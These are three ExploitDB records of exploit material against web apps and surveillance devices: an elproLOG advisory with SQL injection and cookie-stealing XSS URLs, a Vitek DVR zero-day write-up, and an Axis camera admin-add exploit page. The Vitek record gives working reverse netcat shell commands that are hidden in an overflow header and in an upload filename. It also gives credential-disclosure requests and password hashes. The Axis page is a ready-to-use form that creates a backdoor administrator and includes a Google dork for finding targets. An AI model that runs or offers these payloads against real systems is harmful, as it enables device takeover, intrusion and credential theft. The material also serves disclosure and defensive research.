{'code': 'Title:\r\n======\r\nelproLOG MONITOR WebAccess 2.1 - Multiple Vulnerabilities\r\n\r\n\r\nDate:\r\n=====\r\n2013-09-24\r\n\r\n\r\nReferences:\r\n===========\r\nhttp://www.vulnerability-lab.com/get_content.php?id=1086\r\n\r\n\r\nVL-ID:\r\n=====\r\n1086\r\n\r\n\r\nCommon Vulnerability Scoring System:\r\n====================================\r\n6.7\r\n\r\n\r\nIntroduction:\r\n=============\r\nWeb-based access to your monitoring data. elproLOG MONITOR WebAccess enables you to reliably access your data from any computer  \r\nanywhere in the world. Regular it will be used in combination with a surveillance cam and dvr system too.\r\n\r\n(Copy of the Vendor Homepage: http://www.elpro.com/en/products/software/product/elprolog-monitor-webaccess/pa/single/pc/product/ )\r\n\r\n\r\nAbstract:\r\n=========\r\nThe Vulnerability Laboratory Research Team discovered multiple vulnerabilities in the elproLOG MONITOR WebAccess v2.1 web-application.\r\n\r\n\r\nReport-Timeline:\r\n================\r\n2013-09-24:    Public Disclosure (Vulnerability Laboratory)\r\n\r\n\r\nStatus:\r\n========\r\nPublished\r\n\r\n\r\nAffected Products:\r\n==================\r\nELPRO-BUCHS AG\r\nProduct: elproLOG MONITOR-WebAccess 2.1\r\n\r\n\r\nExploitation-Technique:\r\n=======================\r\nRemote\r\n\r\n\r\nSeverity:\r\n=========\r\nHigh\r\n\r\n\r\nDetails:\r\n========\r\n1.1\r\nA remote blind SQL Injection web vulnerability is detected in the ELPRO elproLOG MONITOR WebAccess v2.1 Web-Application.\r\nThe SQL Injection vulnerability allows an attacker (remote) to execute/inject own SQL commands in the vulnerable\r\nweb-application database management system. \r\n\r\nThe sql injection vulnerability is located in the strend.php file. Remote attackers can inject own sql commands by \r\nattacking via http GET method request the affected id parameter of the vulnerable strend.php file.\r\n\r\nExploitation of the sql injection vulnerabilities requires no or a low privileged application user account and no user interaction. \r\nSuccessful exploitation of the vulnerability results in database management system & application compromise via remote sql injection.\r\n\r\n\r\nVulnerable Module(s):\r\n\t\t\t\t\t[+] Trends\r\n\r\nVulnerable File(s):\r\n\t\t\t\t\t[+] strend.php\r\n\r\nVulnerable Parameter(s):\r\n\t\t\t\t\t[+] id\r\n\r\n\r\n\r\n1.2\r\nA non persistent input validation vulnerability is detected in the elproLOG MONITOR WebAccess v2.1 Web-Application.\r\nThe bug allows remote attackers to force client side browser requests with manipulated web application context or \r\ncross site links.\r\n\r\n\r\nThe first cross site scripting web vulnerability is located in the sensorview.php module when processing to load \r\na manipulated data parameter via GET. The attacker provokes the exception-handling to catch the invalid data error \r\nwith the injected script code (client-side).\r\n\r\nThe secound cross site scripting web vulnerability is located in the strend.php module when processing to load \r\na manipulated name parameter via GET. The attacker provokes the exception-handling to catch the invalid trend id \r\nerror with the injected script code (client-side).\r\n\r\nThe vulnerability can be exploited by remote attackers without required application user account but with low or \r\nmedium  required user interaction. Successful exploitation of the vulnerability results in client side session hijacking, \r\naccount take-over, client side phishing, client side external redirects and client side manipulation of module context.\r\n\r\n\r\nVulnerable Module(s):\r\n\t\t\t\t[+] sensorview\r\n\t\t\t\t[+] trends\r\n\r\nVulnerable File(s):\r\n\t\t\t\t[+] sensorview.php\r\n\t\t\t\t[+] strend.php\r\n\r\nVulnerable Parameter(s):\r\n\t\t\t\t[+] data\r\n\t\t\t\t[+] name\r\n\r\n\r\nProof of Concept:\r\n=================\r\n1.1 - SQL Injection\r\nThe remote sql injection web vulnerability can be exploited by remote attackers without privileged application user account or \r\nuser interaction. For demonstration or reproduce ...\r\n\r\nPoC:\r\nhttp://elpro.localhost:8080/elpro/strend.php?data=8331&id=1+1%27\'[SQL INJECTION VULNERABILITY]--&name=1\r\n\r\n\r\n\r\n1.2 - Client Side Cross Site Scripting\r\nThe client side cross site scripting web vulnerability can be exploited by remote attackers without privileged application user account or \r\nuser interaction. For demonstration or reproduce ...\r\n\r\n\r\nPoC:\r\nhttp://elpro.localhost:8080/elpro-demo/sensorview.php?data=ECOLOG-NET%20Testing-1%27%3Ciframe%20src=http://vuln-lab.com%20onload=alert%28document.cookie%29%3C\r\nException: \tGroup: ECOLOG-NET Testing->"<\r\n\r\n\r\nPoC:\r\nhttp://elpro.localhost:8080/elpro-demo/strend.php?data=8331&id=0&name=->"<%27%27%3Ciframe%20src=http://vuln-lab.com%20onload=alert%28document.cookie%29%3C\r\nException: \tTrend: Error ->"<\r\n\r\n\r\nSolution:\r\n=========\r\n1.1\r\nThe sql injection web vulnerability can be patched by using a secure statement around the id parameter value implementation.\r\nEncode and parse the input or setup an own new exception-handling to prevent future executions of sql commands.\r\n\r\n\r\n1.2\r\nParse and encode the vulnerable data and name parameters to fix the client-side cross site scripting web vulnerability.\r\nEnsure that the parameters are secure encoded in all different section of the application modules.\r\n\r\n\r\nRisk:\r\n=====\r\n1.1\r\nThe security risk of the remote sql injection web vulnerability is estimated as high(+).\r\n\r\n1.2\r\nThe security risk of the client-side cross site scripting web vulnerabilities are estimated as low(+)|(-)medium.\r\n\r\n\r\nCredits:\r\n========\r\nVulnerability Laboratory [Research Team] - Benjamin Kunz Mejri (bkm@evolution-sec.com) [www.vulnerability-lab.com]\r\n\r\n\r\nDisclaimer:\r\n===========\r\nThe information provided in this advisory is provided as it is without any warranty. Vulnerability Lab disclaims all warranties, \r\neither expressed or implied, including the warranties of merchantability and capability for a particular purpose. Vulnerability-\r\nLab or its suppliers are not liable in any case of damage, including direct, indirect, incidental, consequential loss of business \r\nprofits or special damages, even if Vulnerability-Lab or its suppliers have been advised of the possibility of such damages. Some \r\nstates do not allow the exclusion or limitation of liability for consequential or incidental damages so the foregoing limitation \r\nmay not apply. We do not approve or encourage anybody to break any vendor licenses, policies, deface websites, hack into databases \r\nor trade with fraud/stolen material.\r\n\r\nDomains:    www.vulnerability-lab.com   \t- www.vuln-lab.com\t\t\t       - www.evolution-sec.com\r\nContact:    admin@vulnerability-lab.com \t- research@vulnerability-lab.com \t       - admin@evolution-sec.com\r\nSection:    www.vulnerability-lab.com/dev \t- forum.vulnerability-db.com \t\t       - magazine.vulnerability-db.com\r\nSocial:\t    twitter.com/#!/vuln_lab \t\t- facebook.com/VulnerabilityLab \t       - youtube.com/user/vulnerability0lab\r\nFeeds:\t    vulnerability-lab.com/rss/rss.php\t- vulnerability-lab.com/rss/rss_upcoming.php   - vulnerability-lab.com/rss/rss_news.php\r\n\r\nAny modified copy or reproduction, including partially usages, of this file requires authorization from Vulnerability Laboratory. \r\nPermission to electronically redistribute this alert in its unmodified form is granted. All other rights, including the use of other \r\nmedia, are reserved by Vulnerability-Lab Research Team or its suppliers. All pictures, texts, advisories, source code, videos and \r\nother information on this website is trademark of vulnerability-lab team & the specific authors or managers. To record, list (feed), \r\nmodify, use or edit our material contact (admin@vulnerability-lab.com or research@vulnerability-lab.com) to get a permission.\r\n\r\n\t\t\t\tCopyright � 2013 | Vulnerability Laboratory [Evolution Security]\r\n\r\n\r\n\r\n-- \r\nVULNERABILITY LABORATORY RESEARCH TEAM\r\nDOMAIN: www.vulnerability-lab.com\r\nCONTACT: research@vulnerability-lab.com', 'description': 'elproLOG MONITOR Webaccess 2.1 - Multiple Vulnerabilities', 'author': 'Vulnerability-Lab', '_id': 28708, 'source': 'ExploitDB', 'platform': 'php', 'date': '2013-10-04T00:00:00+00:00', 'cve': [], 'type': 'webapps', 'port': 80}
{'code': '[STX]\r\n\r\nSubject: Vitek RCE and Information Disclosure (and possible other OEM)\r\n\r\nAttack vector: Remote\r\nAuthentication: Anonymous (no credentials needed)\r\nResearcher: bashis <mcw noemail eu> (December 2017)\r\nPoC: https://github.com/mcw0/PoC\r\nRelease date: December 22, 2017\r\nFull Disclosure: 0-day\r\n\r\nheap: Executable + Non-ASLR\r\nstack: Executable + ASLR\r\n\r\n-[Manufacture Logo]-\r\n            _ _ _ _ _ _ _ _ _ _ _ _\r\n            \\  _  _   _  _ _ ___\r\n            / /__/ \\ |_/\r\n           / __   /  -  _ ___\r\n          / /  / /  / /\r\n  _ _ _ _/ /  /  \\_/  \\_ ______\r\n___________\\___\\__________________\r\n\r\n\r\n-[OEM (found in the code)]-\r\nVitek (http://www.vitekcctv.com/) - Verified: VT-HDOC16BR_Firmware_1.02Y_UI_1.0.1.R\r\nThrive\r\nWisecon\r\nSanyo\r\nInodic\r\nCBC\r\nElbex\r\nY3K\r\nKTNC\r\n\r\n\r\n-[Stack Overflow RCE]-\r\n\r\n[Reverse netcat shell]\r\n\r\n$ echo -en "GET /dvrcontrol.cgi?nc\\x24\\x7bIFS\\x7d192.168.57.1\\x24\\x7bIFS\\x7d31337\\x24\\x7bIFS\\x7d-e\\x24\\x7bIFS\\x7dsh\\x24\\x7bIFS\\x7d HTTP/1.0\\r\\nAuthorization Pwned: `for((i=0;i<272;i++)); do echo -en "A";done`\\x80\\x9a\\x73\\x02\\xc8\\x4a\\x11\\x20\\r\\n\\r\\n"|ncat 192.168.57.20 81\r\n\r\n[Listener]\r\n\r\n$ ncat -vlp 31337\r\nNcat: Version 7.60 ( https://nmap.org/ncat )\r\nNcat: Generating a temporary 1024-bit RSA key. Use --ssl-key and --ssl-cert to use a permanent one.\r\nNcat: SHA-1 fingerprint: E672 0A5B B852 8EF9 36D0 E979 2827 1FAD 7482 8A7B\r\nNcat: Listening on :::31337\r\nNcat: Listening on 0.0.0.0:31337\r\n\r\nNcat: Connection from 192.168.57.20.\r\nNcat: Connection from 192.168.57.20:36356.\r\n\r\npwd\r\n/opt/fw\r\n\r\nwhoami\r\nroot\r\nexit\r\n$\r\n\r\nNote:\r\n1. Badbytes: 0x00,0x09,0x0a,0x0b,0x0c,0x0d,0x20\r\n2. 0x20 will be replaced with 0x00 by the H4/H1/N1 binary, use this to jump binary included system() address: 0x00114AC8 [system() call in H4]\r\n3. 0x02739A0C + 0x74 = $r11 address we need (0x2739A80) to point our CMD string on heap for system() in $r0\r\n\r\nH1:\r\nVT-HDOC4E_Firmware_1.21A_UI_1.1.C.6\r\n.rodata:005292E8 aEchoSOptVideoS DCB "echo %s > /opt/video_standard",0\r\n.text:001CD138                 SUB             R3, R11, #0x74\r\n.text:001CD13C                 MOV             R0, R3\r\n.text:001CD140                 BL              system\r\n\r\nH4:\r\nVT-HDOC16BR_Firmware_1.02Y_UI_1.0.1.R\r\n.rodata:00B945A0 aEchoSOptVideoS DCB "echo %s > /opt/video_standard",0\r\n.text:00114AC8                 SUB             R3, R11, #0x74\r\n.text:00114ACC                 MOV             R0, R3\r\n.text:00114AD0                 BL              system\r\n\r\nN1:\r\nVT-HDOC8E_Firmware_1.21E_UI_1.1.C.6\r\n.rodata:004A4AC4 aEchoSOptVideoS DCB "echo %s > /opt/video_standard",0\r\n.text:001E9F0C                 SUB             R3, R11, #0x74\r\n.text:001E9F10                 MOV             R0, R3\r\n.text:001E9F14                 BL              system\r\n\r\n\r\n-[PHP RCE]-\r\n\r\nNote: /mnt/usb2 must be mounted and R/W... (normally R/O w/o USB stick inserted)\r\n\r\n[Reverse netcat shell (forking)]\r\n\r\n$ curl -v \'http://192.168.57.20:80/cgi-bin/php/htdocs/system/upload_check.php\' -H "Content-Type: multipart/form-data; boundary=----WebKitFormBoundary1337" -d "`echo -en "\\r\\n\\r\\n------WebKitFormBoundary1337\\r\\nContent-Disposition: form-data; name=\\"MAX_FILE_SIZE\\"\\r\\n\\r\\n100000000\\r\\n------WebKitFormBoundary1337\\r\\nContent-Disposition: form-data; name=\\"userfile\\"; filename=\\"\\|\\|nc\\$\\{IFS\\}\\$\\{REMOTE_ADDR\\}\\$\\{IFS\\}31337\\$\\{IFS\\}-e\\$\\{IFS\\}sh\\$\\{IFS\\}\\&\\$\\{IFS\\}\\|\\|\\"\\r\\nContent-Type: application/gzip\\r\\n\\r\\nPWNED\\r\\n\\r\\n------WebKitFormBoundary1337--\\r\\n\\r\\n"`" -X POST\r\n\r\n200 OK\r\n[...]\r\n> ERROR : Current_fw_info File Open Error<br>> ERROR : dvr_upgrade File Open Error<br>F/W File(||nc${IFS}${REMOTE_ADDR}${IFS}31337${IFS}-e${IFS}sh${IFS}&${IFS}||) Upload Completed.<br>If you want to upgrade please click START button<br><br><form enctype="multipart/form-data" action="fw_update.php" method="post"><input type="hidden" name="PHPSESSID" value="67eaa14441089e5d2e7fe6ff0fa88d42" /><input type="submit" value="START"></form>\t</tbody>\r\n[...]\r\n\r\n[Listener]\r\n\r\n$ ncat -vlp 31337\r\nNcat: Version 7.60 ( https://nmap.org/ncat )\r\nNcat: Generating a temporary 1024-bit RSA key. Use --ssl-key and --ssl-cert to use a permanent one.\r\nNcat: SHA-1 fingerprint: 76D3 7FA3 396A B9F6 CCA6 CEA5 2EF8 06DF FF72 79EF\r\nNcat: Listening on :::31337\r\nNcat: Listening on 0.0.0.0:31337\r\nNcat: Connection from 192.168.57.20.\r\nNcat: Connection from 192.168.57.20:52726.\r\n\r\npwd\r\n/opt/www/htdocs/system\r\n\r\nwhoami\r\nnobody\r\n\r\nls -l /mnt/usb2/\r\ntotal 4\r\ndrwxrwxrwx    2 nobody   nobody           0 Dec 16 02:55 dvr\r\n-rw-------    1 nobody   nobody           7 Dec 16 02:55 ||nc${IFS}${REMOTE_ADDR}${IFS}31337${IFS}-e${IFS}sh${IFS}&${IFS}||\r\nexit\r\n$\r\n\r\n-[Login / Password Disclosure]-\r\n\r\ncurl -v "http://192.168.57.20:80/menu.env" | hexdump -C\r\n[binary config, login and password can be found for admin login and all connected cameras]\r\n\r\nAdmin l/p\r\n[...]\r\n00001380  00 00 00 00 01 01 00 01  01 01 01 00 00 00 00 00  |................|\r\n00001390  00 00 00 00 00 41 44 4d  49 4e 00 00 00 00 00 00  |.....ADMIN......|\r\n000013a0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|\r\n*\r\n00001400  00 00 00 00 00 00 00 00  00 00 00 00 00 00 31 32  |..............12|\r\n00001410  33 34 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |34..............|\r\n00001420  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|\r\n\r\nCameras l/p\r\n[...]\r\n00008d80  00 00 00 00 c0 00 a8 00  01 00 15 00 92 1f 00 00  |................|\r\n00008d90  91 1f 00 00 72 6f 6f 74  00 00 00 00 00 00 00 00  |....root........|\r\n00008da0  00 00 00 00 70 61 73 73  00 00 00 00 00 00 00 00  |....pass........|\r\n00008db0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|\r\n00008dc0  00 00 00 00 00 00 00 00  00 00 00 00 c0 00 a8 00  |................|\r\n00008dd0  01 00 16 00 94 1f 00 00  93 1f 00 00 72 6f 6f 74  |............root|\r\n00008de0  00 00 00 00 00 00 00 00  00 00 00 00 70 61 73 73  |............pass|\r\n00008df0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|\r\n\r\n-[Hardcode l/p]-\r\nFTP: TCP/10021\r\nTELNET: TCP/10023\r\n\r\n/etc/passwd\r\nroot:$1$5LFGqGq.$fUozHRdzvapI2qBf1EeoJ0:0:0:root:/root:/bin/sh\r\nwoody:$1$e0vY7A0V$BjS38SsHNWC5DxEGlzuEP1:1001:100:woohyun digital user:/home/woody:/bin/sh\r\n\r\n-[Korean hardcoded DNS]-\r\n$ cat /etc/resolv.conf\r\nnameserver 168.126.63.1\r\nnameserver 0.0.0.0\r\nnameserver 0.0.0.0\r\n$\r\n\r\n$ nslookup 168.126.63.1\r\n1.63.126.168.in-addr.arpa\tname = kns.kornet.net.\r\n$ nslookup 168.126.63.2\r\n2.63.126.168.in-addr.arpa\tname = kns2.kornet.net.\r\n\r\n\r\n-[Other Information Disclosure]-\r\ncurl -v "http://192.168.57.20:80/webviewer/netinfo.dat"\r\n192,168,57,20\r\n192,168,2,100\r\n00:0A:2F:XX:XX:XX\r\n00:0A:2F:YY:YY:YY\r\n255.255.255.0\r\n192.168.57.1\r\n\r\n-[MAC Address Details]-\r\nCompany: Artnix Inc.\r\nAddress: Seoul 137-819, KOREA, REPUBLIC OF\r\nRange: 00:0A:2F:00:00:00 - 00:0A:2F:FF:FF:FF\r\nType: IEEE MA-L\r\n\r\ncurl -v "http://192.168.57.20:80/webviewer/gw.dat"\r\nKernel IP routing table\r\nDestination     Gateway         Genmask         Flags Metric Ref    Use Iface\r\n192.168.2.0     0.0.0.0         255.255.255.0   U     0      0        0 eth1\r\n192.168.57.0    0.0.0.0         255.255.255.0   U     0      0        0 eth0\r\n0.0.0.0         192.168.57.1    0.0.0.0         UG    0      0        0 eth0\r\n\r\ncurl -v "http://192.168.57.20:80/cgi-bin/php/lang_change.php?lang=0"\r\nChange GUI Language to English\r\n\r\n[... and more]\r\n\r\n[ETX]', 'description': 'Vitek - Remote Command Execution / Information Disclosure (PoC)', 'author': 'bashis', '_id': 44000, 'source': 'ExploitDB', 'platform': 'multiple', 'date': '2017-12-22T00:00:00+00:00', 'cve': [], 'type': 'remote', 'port': 0}
{'code': 'source: http://www.securityfocus.com/bid/11011/info\r\n\r\nA hardcoded backdoor administrative-user issue allows remote attackers to administer affected devices. This likely cannot be disabled.\r\n \r\nThis issue is reported to affect:\r\n- Axis StorePoint CD E100 CD-ROM Server with firmware version 5.30\r\n \r\n<?php\r\n###########################################################################\r\n#          03/11/2007 | 3:00        #\r\n#    |#|axisNC.php        #\r\n#          |#|Axis Network Camera HTTP Authentication Bypass|#|\r\n#\r\n#                          Exploit:        #\r\n#              plz help as friend to ours new project iam or maroc \r\ntelecom\r\n                      company                                    #\r\n#                         By  ConcorDHacK and xcoder            #\r\n#                    moroccan-hackers-sabotage.co.ma                      \r\n#\r\n#|    Remplace [IP]or[Hostname] by onother IP or Hostname    #\r\n#          |#|Affected Products|#|       #\r\n#           #\r\n# AXIS 2100 Network Camera versions 2.32 and previous    #\r\n# AXIS 2110 Network Camera versions 2.32 and previous    #\r\n# AXIS 2120 Network Camera versions 2.32 and previous    #\r\n# AXIS 2130 PTZ Network Camera versions 2.32 and previous    #\r\n# AXIS 2400 Video Server versions 2.32 and previous    #\r\n# AXIS 2401 Video Server versions 2.32 and previous    #\r\n# AXIS 2420 Network Camera versions 2.32 and previous    #\r\n# AXIS 2460 Network DVR versions 3.00 and previous    #\r\n# AXIS 250S Video Server versions 3.02 and previous    #\r\n# i know this exploit its old but the new is if add new password\r\n         this password give you ftp access\r\n!!!!!!!!!!!!!!!!!!!!!!!!!          #\r\n#    |#|Google dork : intitle:"Axis 2100 Network Camera" ....       #\r\n#           #\r\nerror_reporting(0);\r\nini_set("max_execution_time",0);\r\nini_set("default_socket_timeout", 2);\r\nob_implicit_flush (1);\r\n?>\r\n<style\r\ntype="text/css">body{background-color:black; \r\nSCROLLBAR-ARROW-COLOR:#ffffff;\r\nSCROLLBAR-BASE-COLOR: black; color:   red; } img \r\n{background-color:#FFFFFF}\r\ninput  {background-color:black} option{ background-color: black}   \r\ntextarea\r\n{background-color: black } input {color: red } option {color: red \r\n}textarea\r\n{color: red }checkbox{background-color: black }select {font-weight:\r\nnormal;\r\ncolor:\r\n#1CB081;background-color:black;}body{font-size:8pt;background-color:\r\nblack;body * {font-size: 8pt } h1 {font-size:0.8em }h2{font-size:0.8em}  \r\nh3\r\n{font-size: 0.8em} h4,h5,h6{font-size:0.8em}h1 font{font-size:0.8em}h2 \r\nfont\r\n{font-size:0.8em } h3 font {font-size:  0.8em}h4 font,h5  font,h6      \r\nfont\r\n{font-size:  0.8em } *  {font-style:  normal }    *{text-decoration: \r\nnone }\r\na:link,a:active,a:visited{ text-decoration: none ; color : black; } \r\na:hover\r\n{text-decoration: underline;color : black; } .Stile5 {font-family: \r\nVerdana,\r\nArial, Helvetica,  sans-serif;  font-size: 10px; }  .Stile6   \r\n{font-family:\r\nVerdana,  Arial,  Helvetica,     sans-serif;font-weight:bold;   \r\nfont-style:\r\nitalic;}--></style>\r\n<script LANGUAGE="JavaScript">\r\nvar password = new Array(20)\r\nfunction formatPassword(pwString)\r\n{\r\nvar code\r\nvar pwCoded = ""\r\nfor (var i=0; i<pwString.length; i++) {\r\ncode = pwString.charCodeAt(i)\r\nif (code < 10)\r\npwCoded += "00" + code\r\nelse if (code < 100)\r\npwCoded += "0" + code\r\nelse\r\npwCoded += code\r\n}\r\nreturn pwCoded\r\n}\r\nfunction parseUsers()\r\n{\r\nvar form = document.WizardForm\r\nvar list = form.users\r\nvar str = form.conf_Security_List.value\r\nvar name\r\nvar rights\r\nvar pwCoded\r\nvar pwString\r\nvar noOfUsers = 0\r\nvar index = str.indexOf(":")\r\nlist.length = 0\r\nwhile (!(index == -1)) {\r\nname = str.substr(0,index)\r\nstr = str.substr(index+1, str.length-index-1)\r\nindex = str.indexOf(":")\r\nrights = str.substr(0,index)\r\nstr = str.substr(index+1, str.length-index-1)\r\nindex = str.indexOf(":")\r\npwCoded = str.substr(0,index)\r\nstr = str.substr(index+1, str.length-index-1)\r\npwString = ""\r\nlist.length++\r\nlist.options[noOfUsers].value = name\r\nif (rights.length > 0)\r\nlist.options[noOfUsers].text = name + ":" + rights\r\nelse\r\nlist.options[noOfUsers].text = name\r\npassword[noOfUsers] = pwString\r\nnoOfUsers++\r\nindex = str.indexOf(":")\r\n}\r\n}\r\nfunction formatUsers()\r\n{\r\nvar form = document.WizardForm\r\nvar list = form.users\r\nvar str = ""\r\nfor (var i=0; i<list.length; i++) {\r\nstr = str + list.options[i].text\r\nif (isAdmin(i) || isView(i) || isDial(i))\r\nstr += ":"\r\nelse\r\nstr += "::"\r\nstr +=  formatPassword(password[i]) + ":"\r\n}\r\nform.conf_Security_List.value = str\r\n}\r\nfunction contains(ch, index)\r\n{\r\nvar form = document.WizardForm\r\nvar list = form.users\r\nvar text = list.options[index].text\r\nvar lenValue = list.options[index].value.length\r\nvar lenText  = text.length\r\nif (lenValue == lenText) {\r\nreturn false  // No user rights\r\n} else {\r\nfor (var i=lenValue+1; i<lenText; i++) {\r\nif (text.charAt(i) == ch) {\r\nreturn true\r\n}\r\n}\r\nreturn false\r\n}\r\n}\r\nfunction isAdmin(index)\r\n{\r\nreturn contains("A", index)\r\n}\r\nfunction isView(index)\r\n{\r\nreturn contains("V", index)\r\n}\r\nfunction isDial(index)\r\n{\r\nreturn contains("D", index)\r\n}\r\nfunction UserChange()\r\n{\r\nvar form = document.WizardForm\r\nvar list = form.users\r\nvar index = list.selectedIndex\r\nform.username.value = list.options[index].value\r\nform.password1.value = password[index]\r\nform.password2.value = password[index]\r\nform.checkAdmin.checked = isAdmin(index)\r\nform.checkDial.checked = isDial(index)\r\nform.checkView.checked = isView(index)\r\n}\r\nfunction deleteUser()\r\n{\r\nvar list = document.WizardForm.users\r\nif ((list.selectedIndex != -1) &&\r\n(list.options[list.selectedIndex].text.substr(0,4)\r\n== "root")) {\r\nalert("The \'root\' user cannot be deleted.")\r\n} else if (!(list.selectedIndex == -1)) {\r\nfor (var i = list.selectedIndex; i<list.length-1 ; i++) {\r\nlist.options[i].text = list.options[i+1].text\r\nlist.options[i].value = list.options[i+1].value\r\npassword[i] = password[i+1]\r\n}\r\nlist.length--\r\n}\r\n\r\nif (list.selectedIndex == -1)\r\nlist.selectedIndex = list.length-1\r\nUserChange()\r\n}\r\nfunction addUserButton()\r\n{\r\naddUser(false)  // false means that an empty user is not accepted\r\n}\r\nfunction addUser(ignoreEmptyUser)\r\n{\r\nvar form = document.WizardForm\r\nvar list = form.users\r\nvar newUser\r\nvar index = -1\r\nif ((ignoreEmptyUser) && (form.username.value == ""))\r\nreturn 1\r\nif (list.length == 20) {\r\nalert("It is not possible to add more than 20 users.")\r\nform.username.select()\r\nform.username.focus()\r\nreturn 0\r\n}\r\nif (list.length == 1 && list.options[0].value == "")\r\nindex = 0\r\nelse {\r\nfor (var i = 0; i<list.length ; i++) {\r\nif (list.options[i].value == form.username.value)\r\nindex = i\r\n}\r\n}\r\nnewUser = (index == -1)\r\nif ((checkUserName() == 1) && (checkPasswords(newUser) == 1) &&\r\n(checkRights() == 1)) {\r\nif (newUser) {\r\nindex = list.length\r\nlist.length++\r\n}\r\nlist.options[index].value = form.username.value\r\nlist.options[index].text = form.username.value + strRights()\r\npassword[index] = form.password1.value\r\n} else {\r\nreturn 0\r\n}\r\nlist.selectedIndex = index\r\nreturn 1\r\n}\r\nfunction clearUser()\r\n{\r\nvar form = document.WizardForm\r\nform.username.value = ""\r\nform.password1.value = ""\r\nform.password2.value = ""\r\n}\r\nfunction strRights()\r\n{\r\nvar form = document.WizardForm\r\nvar str = ":"\r\nif (!(form.checkAdmin.checked || form.checkDial.checked ||\r\nform.checkView.checked))\r\nreturn ""\r\nif (form.checkAdmin.checked)\r\nstr += "A"\r\nif (form.checkDial.checked)\r\nstr += "D"\r\nif (form.checkView.checked)\r\nstr += "V"\r\nreturn str\r\n}\r\nfunction checkUserName()\r\n{\r\nvar form = document.WizardForm\r\nvar aName = form.username.value\r\nvar c\r\nfor (var i = 0; i < aName.length; i++)\r\n{\r\nc = aName.charAt(i)\r\n}\r\nreturn 1\r\n}\r\nfunction checkPasswords(newUser)\r\n{\r\nvar form = document.WizardForm\r\nvar aPass1 = form.password1.value\r\nvar aPass2 = form.password2.value\r\nvar c\r\nreturn 1\r\n}\r\nfunction checkRights()\r\n{\r\nvar form = document.WizardForm\r\nvar aAdmin = form.checkAdmin\r\nvar aDial = form.checkDial\r\nvar aView = form.checkView\r\nif (!(aAdmin.checked || aDial.checked || aView.checked)) {\r\nalert("Select User Rights before adding user.")\r\naAdmin.focus()\r\naAdmin.select()\r\nreturn 0\r\n}\r\nreturn 1\r\n}\r\n//-->\r\n</script>\r\n<script LANGUAGE="JavaScript">\r\n<!--\r\nfunction onLoad()\r\n{\r\nparseUsers()\r\n}\r\nfunction saveData()\r\n{\r\nvar form = document.WizardForm\r\nif (addUser(true) == 1) {  // true means "ignore empty user"\r\nformatUsers()\r\nform.submit()\r\n}\r\n}\r\n//-->\r\n</script>\r\n</HEAD>\r\n<BODY BGCOLOR="black" LINK="gray" VLINK="gray" ALINK="gray"\r\nONLOAD="onLoad()">\r\n<TABLE BORDER="0" WIDTH="1100" HEIGHT="400" CELLSPACING="0" \r\nCELLPADDING="0">\r\n<TR><TD COLSPAN="2">\r\n\r\n\r\n\r\n\r\n<FORM ACTION="http://194.168.163.96//this_server/ServerManager.srv"\r\nMETHOD="POST" NAME="WizardForm">\r\n\r\n\r\n\r\n\r\n<TABLE BORDER="0" CELLSPACING="0" CELLPADDING="0">\r\n<TR><TD COLSPAN="2">\r\n<INPUT TYPE="hidden" NAME="conf_Security_List" VALUE="root:ADVO::">\r\n<FONT FACE="ARIAL, GENEVA" SIZE="2"><B>A script By ConcorDHacK <br><a \r\nhref="\r\nhttp://www.hackzord-security.fr.tc"><font color="red"><i><u>[\r\nwww.hackzord-security.fr.tc]</a></B></FONT>\r\n</TD><BR><BR></TR><TR><TD COLSPAN="2"><FONT FACE="Arial, Geneva"\r\nSIZE="2"><SELECT NAME="users" SIZE="2" onchange="UserChange()">\r\n<OPTION value="Dummy">WWWWWWWWWW:ADV\r\n</SELECT></FONT></TD><TD></TD><TR><TD \r\nCOLSPAN="2"></TD><TD></TD></TR><TR><TD\r\nCOLSPAN="4"><HR></TD></TR><TR><TD><FONT FACE="Arial, Geneva" \r\nSIZE="2"><b>New\r\nAdmin:</FONT></TD>\r\n<TD><FONT FACE="Arial, Geneva" SIZE="2"><INPUT name="username" \r\ntype="text"\r\nsize="30"> (Ex : ConcorDHacK or just root)</FONT></TD>\r\n</TR><TR><TD><FONT FACE="Arial, Geneva"\r\nSIZE="2"><b>Password:</FONT></TD><TD><FONT FACE="Arial, Geneva"\r\nSIZE="2"><INPUT name="password1" type="password" size="30">\r\nPassword of your choice (Ex : 123456 )</FONT></TD>\r\n</TR><TR><TD><FONT FACE="Arial, Geneva" SIZE="2"><b>Verify:</FONT></TD>\r\n<TD><FONT FACE="Arial, Geneva" SIZE="2"><INPUT name="password2"\r\ntype="password" size="30"> Confirm your password</FONT></TD>\r\n</TR><TR><TD><FONT FACE="Arial, Geneva" \r\nSIZE="2"><b>Signature:</FONT></TD>\r\n<TD><FONT FACE="Arial, Geneva" SIZE="2"><INPUT name="conf_Image_UseText"\r\ntype="text" size="30" value=""> Your signature in the administration by\r\nHTML/Javascript code  after "> (Ex : ">\r\n<script>alert("LOL")</script></pre></FONT></TD>\r\n</TR><TR><TD><FONT FACE="Arial, Geneva" SIZE="2"><b>User Rights:\r\n</FONT></TD><TD><FONT FACE="Arial, Geneva" SIZE="2"><INPUT \r\nNAME="checkAdmin"\r\nTYPE="checkbox"><b>Admin\r\n<TR><TD></TD><TD><FONT FACE="Arial, Geneva" SIZE="2"><INPUT \r\nNAME="checkDial"\r\nTYPE="checkbox"><b> Dial-in </TD></TR></font><TR><TD></TD><TD><FONT\r\nFACE="Arial, Geneva" SIZE="2">\r\n<INPUT NAME="checkView" TYPE="checkbox"><b> View\r\n</TD></TR></FONT></TD></TR><TR><TD COLSPAN="2" ALIGN="center"><br>\r\n<table border="0" cellspacing="1" cellpadding="1"\r\nwidth="300"bgcolor="#ffffff"><tr><td bgcolor="red" width="20%"\r\nheight="16"><center><b><font color="black"><A\r\nHREF="javascript:saveData()">-=[Go!Go!]=-</A></font></td>\r\n</TD></TR></TABLE><INPUT TYPE="HIDDEN" NAME="servermanager_return_page"\r\nVALUE="/admin/setgen/security.shtml">\r\n<INPUT TYPE="HIDDEN" NAME="servermanager_do"\r\nVALUE="set_variables"></FORM></TD></TR></TABLE></BODY></HTML>', 'description': 'Axis Network Camera 2.x And Video Server 1-3 - HTTP Authentication Bypass', 'author': 'bashis', '_id': 24402, 'source': 'ExploitDB', 'platform': 'cgi', 'date': '2004-08-23T00:00:00+00:00', 'cve': [], 'type': 'webapps', 'port': 0}
